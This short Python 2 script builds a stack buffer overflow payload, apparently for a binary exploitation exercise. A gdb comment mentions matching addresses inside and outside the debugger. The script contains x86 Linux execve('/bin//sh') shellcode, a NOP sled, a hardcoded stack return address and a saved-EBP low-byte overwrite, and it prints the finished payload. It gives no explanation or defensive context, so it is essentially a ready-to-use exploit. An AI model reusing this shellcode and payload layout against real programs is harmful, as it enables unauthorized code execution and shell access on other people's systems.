### Note: See /notes to know how to make address inside and outside gdb are the same ###

import struct

ESP = struct.pack("I", 0xffffdeef)
SC = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
stuff= '1234abcdefghijklmnopq'

ECX = struct.pack("I", 0xffffdeef)
lowEBP = "\x6c"

payload = stuff + ESP + "\x90"*(78-len(ESP+SC+stuff)) + SC + ECX
payload += "B"*(126 - len(payload)) + lowEBP

print payload
